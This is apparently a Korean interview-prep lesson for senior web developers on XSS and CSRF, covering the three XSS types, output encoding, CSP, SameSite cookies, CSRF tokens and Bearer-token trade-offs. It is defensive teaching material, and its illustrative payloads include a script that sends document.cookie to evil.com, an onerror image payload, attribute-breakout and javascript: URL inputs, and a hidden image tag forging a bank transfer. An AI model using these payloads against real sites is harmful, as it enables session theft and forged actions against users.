1. 왜 "브라우저가 알아서 막아주지 않냐"는 질문을 받는가

XSS(Cross-Site Scripting)와 CSRF(Cross-Site Request Forgery)는 이름부터 헷갈리기 쉽고, "브라우저 최신 버전을 쓰면 어느 정도 막아주지 않나요?"라는 반응이 흔하다. 면접관이 이 주제를 깊게 파고드는 이유는 두 취약점 모두 브라우저가 "정상적으로" 동작한 결과로 발생하기 때문이다. 브라우저의 버그가 아니라, 웹의 기본 신뢰 모델(같은 origin에서 온 스크립트는 실행한다, 쿠키는 자동으로 붙여 보낸다)을 공격자가 악용하는 것이다. 이걸 이해하지 못하면 "필터링 좀 하면 되지 않나요" 수준에서 답이 멈춘다.

실무 상황

쇼핑몰 리뷰 게시판에 사용자가 남긴 리뷰 텍스트를 그대로 HTML로 렌더링했다. 한 사용자가 리뷰에 <script> 태그를 심었고, 이 리뷰를 본 모든 사용자의 브라우저에서 그 스크립트가 실행되며 세션 쿠키가 공격자 서버로 전송됐다. 동시에, 로그인 상태를 유지하는 관리자 페이지의 "계정 삭제" 폼에 CSRF 방어가 없어서, 공격자가 만든 페이지에 로그인한 관리자가 접속하기만 해도 본인도 모르게 계정 삭제 요청이 전송됐다. 두 취약점은 종종 함께 등장하며, 서로 공격을 증폭시킨다.

시니어에게 기대하는 것은 "XSS는 스크립트 주입, CSRF는 위조 요청"이라는 사전적 정의가 아니라, 왜 이 공격이 성립하는지를 브라우저의 동작 모델부터 설명하고, 어떤 방어를 어느 층에 배치해야 하는지 trade-off와 함께 설계할 수 있는 능력이다.

흔한 오해 — "입력값 검증(validation)을 잘 하면 XSS와 CSRF 둘 다 막힌다"

입력 검증은 "이상한 형식의 데이터를 걸러내는 것"이고, XSS 방어는 "출력 시점에 브라우저가 코드로 해석하지 못하게 만드는 것"이다. 둘은 다른 층위의 방어다. 이름에 <, >가 들어갈 수 없다고 막아도, 정상적인 텍스트(예: "3 < 5는 참이다")를 다루는 게시판에서는 그 필터를 적용할 수 없다. 게다가 CSRF는 애초에 "악성 입력"이 아니라 정상적인 요청을 공격자가 대신 보내는 것이라 입력 검증과는 아예 관계가 없다.

2. XSS의 원리 — 신뢰 경계가 브라우저에서 무너지는 지점

전제 개념: 브라우저는 왜 페이지에 있는 <script>를 실행하는가?

브라우저는 서버가 보내준 HTML을 렌더링하면서, 그 안에 있는 <script> 태그나 onclick 같은 이벤트 핸들러 속성을 "이 페이지를 만든 사이트가 넣은 정당한 코드"로 신뢰하고 실행한다. 이건 웹이 동작하기 위한 정상적인 설계다 — 문제는 사용자가 입력한 데이터가 "코드가 실행되는 위치"에 그대로 삽입될 때 발생한다. SQL Injection이 "데이터와 SQL 명령어의 경계 붕괴"였다면, XSS는 "데이터와 HTML/JS 코드의 경계 붕괴"다. 원리 자체는 동일한 패턴이다. 

<!-- 취약한 코드 — 사용자 입력을 그대로 HTML에 삽입 -->
<div>댓글: {{ user_comment }}</div>

<!-- 정상 입력: "좋은 제품이네요" -->
<div>댓글: 좋은 제품이네요</div>

<!-- 공격 입력: <script>fetch('https://evil.com/steal?c='+document.cookie)</script> -->
<div>댓글: <script>fetch('https://evil.com/steal?c='+document.cookie)</script></div>
<!-- 브라우저는 이걸 "이 사이트가 넣은 정당한 스크립트"로 취급하고 그대로 실행한다 -->
핵심 원리

공격자의 목표는 자기 코드를 피해자의 브라우저에서, 피해자가 로그인한 사이트의 origin으로 실행시키는 것이다. 이 조건이 성립하면 공격자 스크립트는 document.cookie, localStorage, 화면의 DOM 전체에 접근할 수 있고, 피해자 대신 그 사이트에 로그인된 상태로 요청을 보낼 수도 있다. "다른 사이트에서 온 스크립트가 이 사이트인 척 실행된다"는 것, 이것이 Cross-Site Scripting이라는 이름의 의미다.

3. XSS 세 가지 유형 — Reflected / Stored / DOM-based

면접에서 "XSS가 뭔가요"에 이어 반드시 나오는 질문이 "그럼 종류가 몇 가지 있고 뭐가 다른가요"다. 세 유형은 "공격 스크립트가 어디를 거쳐서 브라우저에 도달하는가"로 구분된다. 이 경로 차이가 방어 위치를 결정한다.

Reflected XSS

공격 스크립트가 URL 파라미터 등 요청 자체에 담겨 서버로 전송되고, 서버가 그 값을 검증 없이 응답 HTML에 "반사"시켜 즉시 실행된다. DB에 저장되지 않는다.

전형적 시나리오: 검색 결과 페이지에 ?q=검색어를 그대로 출력. 공격자가 악성 링크를 만들어 피해자에게 클릭을 유도해야 성립.

Stored XSS

공격 스크립트가 DB 등 서버에 영구 저장되고, 이후 그 데이터를 조회하는 모든 사용자의 브라우저에서 실행된다. 게시글, 댓글, 프로필 소개글이 전형적 경로다.

왜 더 위험한가: 클릭 유도가 필요 없다. 페이지를 방문하는 것만으로 자동 실행되며, 피해자 규모가 훨씬 커진다.

DOM-based XSS — 서버는 정상인데 클라이언트 JS가 뚫리는 경우

서버 응답에는 악성 코드가 전혀 없어도, 클라이언트 자바스크립트가 URL이나 사용자 입력을 읽어서 DOM에 직접 삽입하는 코드가 취약점이 된다. 예를 들어 document.write(location.hash)처럼 URL의 # 뒤 값을 그대로 페이지에 꽂아 넣으면, 서버는 이 값을 아예 보지도 못하지만 브라우저 안에서 스크립트가 실행된다. 

// 취약한 클라이언트 코드
const params = new URLSearchParams(location.search);
document.getElementById('welcome').innerHTML = "환영합니다, " + params.get('name');
// URL: example.com/?name=<img src=x onerror=alert(document.cookie)>
// 서버 로그에는 정상 요청으로 남지만, 브라우저에서 innerHTML이 그대로 코드로 해석됨
흔한 오해 — "서버에서 이스케이프만 잘 하면 XSS는 다 막힌다"

DOM-based XSS는 서버를 아예 거치지 않는 경로도 존재한다(예: location.hash는 서버로 전송되지 않는다). 서버 사이드 방어만으로는 이 유형을 막을 수 없고, 클라이언트 코드에서 innerHTML, document.write, eval 같은 "싱크(sink)"에 신뢰할 수 없는 데이터가 흘러 들어가는 경로 자체를 점검해야 한다.

4. XSS 방어 — 출력 인코딩, 프레임워크 기본값, CSP

전제 개념: "이스케이프"와 "출력 컨텍스트별 인코딩"은 다르다

SQL Injection에서 "이스케이프는 근본 방어가 아니다"를 배웠다. XSS 방어는 조금 다르다 — 여기서는 출력 컨텍스트(HTML 본문, HTML 속성, JS 문자열, URL)마다 인코딩 규칙이 다르다는 것이 핵심이다. 같은 사용자 입력이라도 <div>{{ input }}</div>에 넣을 때와 <a href="{{ input }}">에 넣을 때 위험한 문자와 인코딩 방식이 다르다. 

<!-- HTML 본문 컨텍스트: < > & " ' 를 HTML 엔티티로 -->
사용자 입력 <script> → &lt;script&gt; (텍스트로만 표시, 실행 안 됨)

<!-- HTML 속성 컨텍스트: 속성값에서 벗어나는 걸 막아야 함 -->
<input value="{{ input }}">
<!-- input = " onmouseover="alert(1) 이면 속성이 조기 종료되고 새 속성이 주입됨 -->

<!-- URL 컨텍스트: javascript: 스킴 자체를 막아야 함 -->
<a href="{{ input }}">링크</a>
<!-- input = javascript:alert(document.cookie) 이면 클릭 시 스크립트 실행 -->
근본 방어 원칙 — "이스케이프를 직접 짜지 말고 프레임워크의 자동 이스케이프를 신뢰하라"

React의 JSX({value}), Vue의 {{ value }}, Django/Jinja 템플릿은 기본적으로 출력 시 자동 이스케이프를 적용한다. 문제는 이 안전장치를 개발자가 명시적으로 우회하는 API다: React의 dangerouslySetInnerHTML, Vue의 v-html, 순수 JS의 innerHTML. 코드 리뷰에서 이 API들이 보이면 반드시 "왜 자동 이스케이프를 우회해야 했는지, 그 값이 신뢰할 수 있는 출처인지"를 확인해야 한다.

위험한 패턴
// React
<div dangerouslySetInnerHTML={{__html: userBio}} />

// Vue
<div v-html="userBio"></div>

// Vanilla JS
el.innerHTML = userComment;
안전한 패턴
// React — 기본 JSX가 자동 이스케이프
<div>{userBio}</div>

// 리치 텍스트가 꼭 필요하다면 sanitize 라이브러리
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userComment);

전제 개념: CSP(Content Security Policy)는 "실행 가능한 스크립트의 출처"를 화이트리스트로 제한한다

출력 인코딩이 뚫리는 실수가 한 번이라도 발생하면 XSS가 성립한다. CSP는 그 마지막 방어선으로, "이 페이지에서는 이 출처의 스크립트만 실행을 허용한다"는 규칙을 HTTP 헤더로 브라우저에 강제한다. 

Content-Security-Policy: script-src 'self' https://cdn.trusted.com; object-src 'none'
# 'self'(같은 origin)와 지정한 CDN 외의 스크립트는 인라인이든 외부든 브라우저가 실행 자체를 거부한다.
# 공격자가 삽입한 <script>evil()</script>가 있어도, 브라우저가 이 정책을 보고 실행을 차단한다.
계층적 방어(Defense in Depth) — XSS
  • 1차 방어 — 프레임워크 자동 이스케이프: 기본 출력 방식을 그대로 사용, 우회 API 최소화
  • 2차 방어 — 컨텍스트별 올바른 인코딩: HTML/속성/URL/JS 컨텍스트를 구분해 처리
  • 3차 방어 — 리치 텍스트는 sanitize 라이브러리: 정규식 직접 작성 금지, 검증된 라이브러리(DOMPurify 등) 사용
  • 4차 방어 — CSP: 이스케이프가 뚫려도 스크립트 실행 자체를 origin 화이트리스트로 차단
  • 5차 방어 — 쿠키에 HttpOnly 속성: XSS가 성공해도 JS로 세션 쿠키를 읽지 못하게 피해 범위 축소
흔한 오해 — "CSP를 걸어두면 XSS는 완전히 해결된다"

CSP는 완화(mitigation) 계층이지 근본 방어가 아니다. 'unsafe-inline'을 허용하는 순간 인라인 스크립트가 다시 실행 가능해지고, 화이트리스트에 오른 CDN 자체가 침해당하면(supply chain 공격) CSP로도 막을 수 없다. 또한 기존 레거시 코드가 인라인 스크립트/이벤트 핸들러에 의존하면 엄격한 CSP 적용 자체가 어렵다 — 이건 뒤에서 follow-up으로 다룬다.

5. CSRF의 원리 — "로그인 상태"를 공격자가 훔쳐 쓰는 방법

전제 개념: 브라우저는 왜 쿠키를 "자동으로" 붙여 보내는가?

쿠키 기반 세션 인증에서는 로그인 후 브라우저가 세션 쿠키를 저장하고, 그 쿠키가 유효한 도메인으로 가는 모든 요청에 자동으로 쿠키를 첨부한다. 이건 사용자가 매번 로그인 상태를 유지하기 위해 필요한 정상 동작이다. 문제는 이 자동 첨부가 "요청이 어느 페이지(어느 origin)에서 시작됐는지"는 구분하지 않는다는 점이다. 

<!-- 공격자가 만든 evil.com 페이지 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000" style="display:none">

<!-- 피해자가 bank.com에 로그인된 상태로 evil.com을 방문하면 -->
<!-- 브라우저는 이 <img> 태그의 요청에도 bank.com의 세션 쿠키를 자동으로 붙여 보낸다 -->
<!-- bank.com 서버 입장에서는 "유효한 세션 쿠키를 가진 정상 요청"과 구분할 수 없다 -->
핵심 원리

CSRF는 XSS와 달리 공격자의 코드가 피해자 브라우저에서 실행될 필요가 없다. 공격자는 그저 "피해자가 로그인한 사이트로 요청을 보내는 페이지"를 만들어 클릭이나 방문을 유도하면 된다. 브라우저가 자동으로 쿠키를 붙여 보내주기 때문에, 서버는 이 요청이 "피해자가 진짜로 의도한 요청"인지 "공격자 페이지가 피해자의 브라우저를 시켜서 대신 보낸 요청"인지 구분할 방법이 원래 없다 — 이걸 구분하게 만드는 것이 CSRF 방어다.

흔한 오해 — "GET 요청만 상태를 변경하지 않게 만들면 CSRF는 안전하다"

맞는 방향이지만 충분하지 않다. <img>, <script src>는 GET만 가능하지만, 자동 제출되는 <form>은 POST 요청도 얼마든지 위조할 수 있다. "상태 변경은 GET에 두지 않는다"는 웹 설계 원칙(HTTP 시맨틱스)으로는 맞지만, CSRF 방어 자체를 대체하지는 못한다.

6. CSRF 방어 — SameSite 쿠키와 토큰 검증

Day 2에서 다룬 쿠키 저장 방식(httpOnly)이 XSS로부터 토큰을 지켰다면, 이번엔 같은 쿠키가 "자동 첨부"된다는 성질 자체를 공격에 악용하는 CSRF를 어떻게 막는지를 본다. 방어는 크게 두 층으로 나뉜다.

1층 방어 — SameSite 쿠키 속성

Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax
SameSite=Strict

다른 사이트에서 시작된 요청에는 쿠키를 절대 첨부하지 않는다. 가장 안전하지만, 외부 링크를 타고 처음 들어올 때도 로그인 세션이 인식되지 않아 UX 저하가 생길 수 있다.

SameSite=Lax (기본값)

최상위 페이지 이동을 유발하는 GET 링크 클릭에는 쿠키를 붙이지만, <img>·<form> 자동 제출 같은 배경 요청에는 붙이지 않는다. 대부분의 CSRF 시나리오(자동 제출 폼, 이미지 태그)를 차단한다.

왜 SameSite만으로는 완전하지 않은가

SameSite는 브라우저 지원 여부와 설정 실수에 의존한다. 오래된 브라우저, 쿠키 설정 시 개발자의 실수(속성 누락), 또는 서브도메인 간 요청처럼 "same-site"로 판정되는 경계 케이스(예: a.example.com → b.example.com)에서는 여전히 CSRF가 성립할 수 있다. 그래서 실무에서는 SameSite를 1차 방어로 두고, 상태 변경 요청에는 토큰 기반 검증을 2차 방어로 겹친다.

2층 방어 — CSRF 토큰 (Synchronizer Token Pattern)

서버가 세션마다 예측 불가능한 랜덤 토큰을 발급해 폼에 숨겨두고, 요청 시 이 토큰이 함께 오는지 검증한다. 공격자 페이지는 피해자 세션에 발급된 토큰 값을 알아낼 방법이 없다(same-origin policy 때문에 다른 origin의 응답 내용을 읽어올 수 없음)는 것이 핵심이다. 

<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a1b2c3...(세션별 랜덤 값)">
  ...
</form>

# 서버는 세션에 저장된 토큰과 폼에서 온 토큰이 일치하는지 검증
# 공격자는 evil.com에서 피해자 세션의 실제 토큰 값을 알 수 없으므로 위조 요청에 올바른 토큰을 넣을 수 없다
계층적 방어(Defense in Depth) — CSRF
  • 1차 방어 — SameSite=Lax(또는 Strict) 쿠키: 대부분의 자동 제출 공격을 브라우저 레벨에서 차단
  • 2차 방어 — CSRF 토큰 검증: 상태를 변경하는 모든 요청(POST/PUT/DELETE)에 세션별 토큰 확인
  • 3차 방어 — Origin/Referer 헤더 검증: 요청이 신뢰할 수 있는 origin에서 왔는지 서버에서 재확인
  • 4차 방어 — 민감한 작업에는 재인증 요구: 비밀번호 변경, 송금 등은 CSRF 토큰과 별개로 현재 비밀번호 재입력 요구

7. SPA/API 서버 구조에서 위협 모델이 달라지는 이유

Day 2에서 다룬 "세션 쿠키 vs JWT(Bearer 토큰)" 선택이 CSRF 위협 모델에 직접 영향을 준다. 이 연결을 설명할 수 있는지가 시니어 면접에서 자주 확인하는 지점이다.

쿠키 기반 세션 인증

브라우저가 자동으로 인증 정보(쿠키)를 첨부하기 때문에 CSRF 위험이 구조적으로 존재한다. SameSite + CSRF 토큰 방어가 반드시 필요하다.

Authorization 헤더의 Bearer 토큰

브라우저는 Authorization 헤더를 자동으로 첨부하지 않는다. 클라이언트 JS가 명시적으로 헤더에 담아 보내야 하므로, 공격자 페이지는 피해자의 토큰 값을 모르는 한 이 헤더를 위조할 수 없다. 이 구조에서는 고전적 CSRF는 성립하지 않는다.

그래도 안심할 수 없는 이유

"Bearer 토큰이니 CSRF는 걱정 없다"는 답변은 토큰을 어디에 저장했는지를 놓친다. 토큰을 localStorage에 저장하면 CSRF 위험은 사라지지만 XSS 위험이 커진다(Day 2에서 다룬 trade-off). 반대로 토큰을 쿠키에 저장해서 자동 전송을 이용하면(예: refresh token을 httpOnly 쿠키에) 그 쿠키에 대해서는 다시 CSRF 방어가 필요해진다. 즉 "JWT를 쓴다"는 사실 하나만으로 CSRF 여부가 결정되지 않고, "그 토큰이 브라우저에 의해 자동으로 첨부되는 저장소에 있는가"가 실제 기준이다.

8. 면접 질문 1 — 세 가지 XSS를 실제 코드로 구분

면접 질문
"Reflected, Stored, DOM-based XSS의 차이를 실제 공격 시나리오와 함께 설명하고, 각각 방어 위치가 왜 달라지는지 말씀해주세요."

왜 면접에서 묻는가?

세 유형의 이름만 외운 사람과, 공격 스크립트가 서버를 거치는지 여부에 따라 방어 지점이 달라진다는 것을 이해한 사람을 구분하는 질문이다. 특히 DOM-based XSS는 "서버 응답만 감사하면 된다"는 안일한 생각을 반박하는 좋은 지표가 된다.

답변 사고 순서

  1. 공통점 먼저 짚기 — 셋 다 결국 "신뢰할 수 없는 데이터가 스크립트로 실행되는 위치에 도달"하는 것이 본질임을 말한다.
  2. 경로 차이로 구분 — 요청에 실려 즉시 반사(Reflected), DB에 저장 후 조회 시 실행(Stored), 클라이언트 JS 내부에서만 발생(DOM-based).
  3. 방어 위치 차이로 결론 — 서버 사이드 출력 인코딩으로 막을 수 있는 것과, 클라이언트 코드 자체를 감사해야 하는 것을 구분한다.
강한 답변 예시

"셋 다 공격자가 제어하는 데이터가 브라우저에서 코드로 실행된다는 본질은 같지만, 그 데이터가 도달하는 경로가 다릅니다. Reflected는 검색어처럼 요청 파라미터가 서버 응답에 그대로 반사돼서, 피해자가 악성 링크를 클릭해야 성립합니다. Stored는 댓글처럼 DB에 저장된 값이 조회할 때마다 실행돼서, 클릭 유도 없이 페이지 방문만으로 다수에게 퍼지기 때문에 더 위험도가 높습니다. DOM-based는 서버 응답 자체는 깨끗한데, 클라이언트 자바스크립트가 URL 해시나 쿼리스트링을 직접 읽어서 innerHTML 같은 곳에 꽂아 넣을 때 발생합니다 — 이건 서버 로그나 서버 사이드 이스케이프 감사로는 절대 못 잡고, 프론트엔드 코드에서 innerHTML, document.write, eval 같은 싱크에 신뢰할 수 없는 데이터가 들어가는지를 별도로 점검해야 합니다."

약한 답변 예시

"Reflected는 반사형, Stored는 저장형, DOM은 DOM에서 일어나는 거예요."

왜 약한가? 이름을 그대로 되풀이할 뿐, 방어 전략이 왜 달라지는지에 대한 통찰이 없다.

Senior-level Follow-up 질문들

Follow-up: "DOM-based XSS는 서버 로그에 흔적이 남나요? 탐지는 어떻게 하시겠습니까?"

모범 답변 방향: "URL 해시(#) 뒤의 값은 서버로 전송조차 되지 않는 경우가 많아 서버 로그에 흔적이 없을 수 있습니다. 그래서 탐지는 서버 로그가 아니라 프론트엔드 정적 분석(ESLint 보안 플러그인으로 innerHTML/eval 사용 탐지)과 런타임 CSP report-uri로 실제 위반 시도를 수집하는 방식으로 접근합니다. RUM(Real User Monitoring) 도구에 비정상 JS 에러나 예상치 못한 DOM 변경 패턴을 추적하는 것도 보조적으로 씁니다."

9. 면접 질문 2 — CSP를 도입했는데 왜 여전히 위험한가

면접 질문
"우리 서비스는 이미 Content-Security-Policy 헤더를 적용하고 있습니다. 그런데도 XSS 감사를 계속해야 하는 이유가 있나요?"

왜 면접에서 묻는가?

CSP를 "설정하면 끝나는 스위치"로 여기는지, 아니면 레거시 코드와의 충돌, 정책 우회 가능성, 유지보수 부담까지 이해하고 있는지를 확인하는 질문이다. 실무에서는 CSP를 엄격하게 걸었다가 기존 인라인 스크립트가 다 깨져서 'unsafe-inline'을 다시 허용하는 사례가 흔한데, 이 함정을 아는지를 본다.

답변 사고 순서

  1. CSP의 역할 재확인 — CSP는 "실행 차단"이지 "삽입 방지"가 아님을 짚는다.
  2. 실무 우회/제약 사례 제시 — unsafe-inline 허용, 신뢰한 CDN 자체의 침해, nonce/hash 관리 부담.
  3. 결론 — CSP는 마지막 방어선일 뿐, 출력 인코딩과 sanitize가 여전히 1차 책임임을 강조한다.
강한 답변 예시

"CSP는 '스크립트가 삽입되는 것'을 막는 게 아니라 '삽입된 스크립트가 실행되는 것'을 막는 마지막 방어선입니다. 그래서 두 가지 허점이 남습니다. 첫째, 레거시 코드에 인라인 스크립트나 인라인 이벤트 핸들러가 많으면 엄격한 정책 적용이 어려워서 팀이 결국 script-src에 'unsafe-inline'을 허용하게 되는데, 이 순간 CSP의 XSS 방어 효과 대부분이 사라집니다. 이걸 피하려면 nonce나 hash 기반 정책으로 전환해야 하는데 관리 부담이 있습니다. 둘째, 화이트리스트에 올린 CDN 자체가 공급망 공격을 당하면 CSP는 그 스크립트를 '신뢰할 수 있는 출처'로 그대로 통과시킵니다. 그래서 CSP를 적용했다고 출력 인코딩이나 sanitize 라이브러리 사용을 건너뛰면 안 되고, CSP는 이 1차 방어가 뚫렸을 때의 보험으로 취급해야 합니다."

약한 답변 예시

"CSP를 적용했으면 브라우저가 알아서 스크립트를 다 막아주니 추가 감사는 필요 없다고 생각합니다."

왜 약한가? CSP를 만능 스위치로 오해하고 있으며, unsafe-inline 같은 실무 제약을 겪어본 적이 없다는 신호다.

Senior-level Follow-up 질문들

Follow-up: "레거시 코드에 인라인 스크립트가 수백 곳 있어서 한 번에 제거가 불가능하다면 어떻게 CSP를 도입하시겠습니까?"

모범 답변 방향: "한 번에 강제 적용(enforce)하지 않고, Content-Security-Policy-Report-Only 헤더로 먼저 배포해서 위반 사례를 report-uri로 수집합니다. 실제로 얼마나 많은 인라인 스크립트가 있는지 데이터로 파악한 뒤, 우선순위가 높은 페이지부터 nonce 기반으로 전환하고, 나머지는 단계적으로 마이그레이션합니다. 전면 강제 적용으로 서비스를 깨뜨리는 것보다, 측정 가능한 단계적 롤아웃이 실무적으로 안전합니다."

10. 면접 질문 3 — Bearer 토큰을 쓰면 CSRF는 걱정 안 해도 되는가

면접 질문
"우리 API는 세션 쿠키가 아니라 Authorization 헤더에 Bearer 토큰을 넣어서 인증합니다. 그럼 CSRF 방어는 필요 없는 거죠?"

왜 면접에서 묻는가?

"인증 방식(JWT)"과 "저장 위치(쿠키 vs localStorage vs 메모리)"를 구분해서 사고할 수 있는지를 확인하는 질문이다. 표면적으로는 맞는 방향이지만, 토큰을 실제로 어디에 저장하고 어떻게 전송하는지에 따라 결론이 달라진다는 것을 설명할 수 있어야 시니어 수준으로 인정받는다.

답변 사고 순서

  1. 원칙적으로 맞다는 것 인정 — 브라우저가 Authorization 헤더를 자동 첨부하지 않는다는 사실을 짚는다.
  2. 예외 조건 제시 — refresh token을 쿠키에 저장하는 경우, 또는 CORS 설정 실수로 다른 origin에서도 요청이 성립하는 경우를 짚는다.
  3. trade-off로 마무리 — CSRF는 줄지만 XSS를 통한 토큰 탈취 위험이 늘어날 수 있다는 저장 위치의 trade-off를 연결한다.
강한 답변 예시

"맞는 방향입니다. 브라우저는 Authorization 헤더를 자동으로 붙여 보내지 않기 때문에, 공격자 페이지가 피해자의 토큰 값을 모르는 이상 이 헤더를 위조할 수 없어서 고전적인 CSRF는 성립하지 않습니다. 다만 두 가지는 짚어야 합니다. 하나는 저희가 refresh token을 httpOnly 쿠키에 저장하고 있다면, 그 쿠키에 대해서는 여전히 CSRF 방어(SameSite, 토큰 검증)가 필요하다는 점입니다. 다른 하나는 CSRF 위험이 줄어드는 대신, access token을 어디 저장하느냐의 trade-off가 남는다는 겁니다. 메모리에만 두면 안전하지만 새로고침 시 유실되고, localStorage에 두면 새로고침엔 강하지만 XSS 한 번으로 토큰이 그대로 털립니다. 그래서 결론은 'Bearer 토큰이라 CSRF는 없다'가 아니라, '이 인증 구조에서 실제로 무엇이 자동 전송되고 무엇이 스크립트로 읽힐 수 있는지'를 먼저 확인해야 한다는 겁니다."

약한 답변 예시

"네, JWT를 쓰면 CSRF는 완전히 해결된 문제라서 신경 안 써도 됩니다."

왜 약한가? refresh token 저장 방식이나 CORS 설정 등 실제 구현 디테일을 확인하지 않은 채 결론부터 내렸다. "토큰 방식 = 안전"이라는 단순화는 저장 위치에 따라 틀릴 수 있다.

Senior-level Follow-up 질문들

Follow-up: "CORS 설정이 Access-Control-Allow-Origin: *로 되어 있다면 이 구조에 어떤 위험이 추가됩니까?"

모범 답변 방향: "와일드카드 CORS 자체는 자격 증명(쿠키, Authorization 헤더 포함 요청)에는 브라우저가 적용을 거부하기 때문에 즉시 CSRF로 이어지진 않습니다. 하지만 Access-Control-Allow-Credentials: true와 함께 origin을 잘못 검증해서 사실상 모든 origin을 허용하는 설정 실수가 있다면, 악성 페이지의 JS가 XHR/fetch로 직접 Authorization 헤더를 만들어 보내는 것 자체는 여전히 안 되지만(토큰 값을 모르므로), 만약 토큰이 localStorage에 있고 별도의 XSS 취약점이 하나라도 있다면 그 토큰을 읽어 마음대로 요청을 만들 수 있어 결과적으로 CSRF와 유사한 피해가 발생할 수 있습니다. 그래서 CORS는 항상 명시적 origin 화이트리스트로 좁혀야 합니다."

다음 레슨 예고 — Day 5: 파일 업로드 보안과 SSRF

클라이언트를 겨냥한 공격 다음은 서버가 "사용자가 준 데이터"를 실행/요청하는 지점의 공격이다. 프로필 사진 업로드, 외부 URL 미리보기 같은 흔한 기능이 왜 심각한 침해로 이어지는지 다룬다.

  • 파일 업로드에서 확장자 검증이 왜 충분하지 않은가 — MIME sniffing과 매직 바이트 검증
  • 업로드된 파일이 실행 가능한 경로에 저장될 때 생기는 웹쉘 위험
  • SSRF(Server-Side Request Forgery) — 서버가 대신 요청을 보내주는 기능이 내부망 침투 통로가 되는 원리
  • 클라우드 메타데이터 엔드포인트(169.254.169.254)를 노린 SSRF와 방어 설계
